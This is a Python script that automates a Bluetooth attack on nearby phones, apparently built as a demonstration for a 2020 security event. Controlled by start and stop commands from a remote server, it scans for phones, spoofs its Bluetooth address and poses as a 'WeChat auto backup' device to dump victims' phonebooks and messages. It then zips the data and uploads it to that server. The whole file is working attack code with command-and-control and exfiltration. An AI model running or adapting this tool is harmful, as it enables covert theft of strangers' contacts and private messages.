#!/usr/bin/env python3

import sys
import time
import random
import threading
import subprocess
import shutil
import os
import json
import logging

from subprocess import check_output, STDOUT
from subprocess import TimeoutExpired, CalledProcessError

from pyclui import DEBUG, INFO
import requests

# sys.path.insert(0, '/mnt/hgfs/OneDrive/Projects/bthci/src/')
from bthci import HCI

attack_flag = False
LOCAL_BD_ADDR = 'ff:ff:ff:00:00:00'


def req_attack_flag():
    global attack_flag

    while True:
        try:
            rsp = requests.get('http://10.8.0.2:7777/web/v1/show/cmd')
            print(DEBUG, rsp.text)
            if rsp.text == 'start':
                attack_flag = True
            elif rsp.text == 'stop':
                attack_flag = False
            else:
                attack_flag = False
                raise ValueError()
        except:
            pass
        # print(INFO, 'attack_flag:', attack_flag)
        time.sleep(1)


def gen_random_bd_addr() -> str:
    bd_addr = LOCAL_BD_ADDR
    while bd_addr == LOCAL_BD_ADDR:
        bd_addr = ''
        for i in range(0, 6):
            bd_addr += '%02x'%random.randint(0x00, 0xff) if i == 5 else '%02x:'%random.randint(0x00, 0xff)
    
    return bd_addr


def attack():
    ''' '''
    new_attack = True
    hci = HCI()

    while True:
        try:
            if attack_flag:
                if new_attack:
                    local_bd_addr = gen_random_bd_addr()
                    print(INFO, 'New attack, random local BD_ADDR:', local_bd_addr)
                    new_attack = False
                
                # Scanning Phone BD_ADDR
                output = subprocess.getoutput(
                    ' '.join(['sudo python3 -m', 'bluescan -m br',
                        '|', 'grep Phone -B 9',
                        '|', 'grep -E \'([[:xdigit:]]{2}:){5}[[:xdigit:]]{2}\'',
                        '|', 'sed \'s/.\[1;34m//g;s/.\[0m//g;s/Addr:.//g\'']))
                bd_addrs = output.splitlines()
                print(INFO, 'Phone\'s BD_ADDRs:', bd_addrs)

                # local_bd_addr = '11:22:33:44:55:66'
                # bd_addrs = ['3C:28:6D:E0:58:F7']

                for bd_addr in bd_addrs:
                    try:
                        name = 'unknown'
                        name = hci.remote_name_request({
                            'BD_ADDR': bytes.fromhex(bd_addr.replace(':', '')),
                            'Page_Scan_Repetition_Mode': 0x01, 'Reserved': 0x00, 
                            'Clock_Offset': 0x0000
                        })['Remote_Name'].decode().rstrip('\x00')
                    except Exception as e:
                        logging.exception(e)
                    print(INFO, 'Name of', bd_addr+':', name)
                    
                    output_dir = './' + bd_addr
                    pb_log_path = output_dir+'/pb_attack.log'
                    msg_log_path = output_dir+'/msg_attack.log'
                    zip_path = output_dir+'/'+bd_addr+'.zip'

                    try:
                        os.mkdir(output_dir)
                    except FileExistsError:
                        pass
                        
                    print(INFO, 'PB attack')
                    try:
                        pb_output = check_output(' '.join(['sudo python3 -m', 
                            'bluerepli', '-a', local_bd_addr, '-n', 
                            '"微信自动备份"', '--dump-pb', '-d', output_dir, 
                            bd_addr, '>', pb_log_path]), 
                            stderr=STDOUT, timeout=60, shell=True)
                    except TimeoutExpired:
                        print(DEBUG, 'pb attack TimeoutExpired')
                    except CalledProcessError:
                        print(DEBUG, 'pb attack CalledProcessError')
                    # print(DEBUG, pb_output)

                    time.sleep(1)

                    print(INFO, 'Msg attack')
                    try:
                        msg_output = check_output(' '.join(['sudo python3 -m', 
                            'bluerepli', '-a', local_bd_addr, '-n', 
                            '"微信自动备份"', '--dump-msg', '-d', output_dir, 
                            bd_addr, '>', msg_log_path]), stderr=STDOUT, 
                            timeout=60, shell=True)
                    except TimeoutExpired:
                        print(DEBUG, 'msg attack TimeoutExpired')
                    except CalledProcessError:
                        print(DEBUG, 'msg attack CalledProcessError')
                    # print(DEBUG, msg_output)

                    subprocess.getoutput(' '.join(['zip -r', 
                        '--password CyberSecurityWeek2020', zip_path, output_dir]))
        
                    # print(json.dumps({'BD_ADDR': bd_addr, 'name': name, 'data': open(zip_path, 'rb').read().hex()}))

                    rsp = requests.post('http://10.8.0.2:7777/web/v1/show/upload', 
                        headers={'Content-Type': 'application/json'}, 
                        data=json.dumps({'BD_ADDR': bd_addr, 'name': name, 'data': open(zip_path, 'rb').read().hex()}))
        
                    # print(rsp)
                    
                    # input('enter...')
                    try:
                        shutil.rmtree(output_dir)
                    except:
                        print(Warning, 'shutil.rmtree')
            else:
                new_attack = True

        except Exception as e:
            logging.exception(e)

        time.sleep(1)


def __test():
    pass


def main():
    req_thread = threading.Thread(target=req_attack_flag)
    req_thread.start()
    attack()
    req_thread.join()


if __name__ == '__main__':
    main()
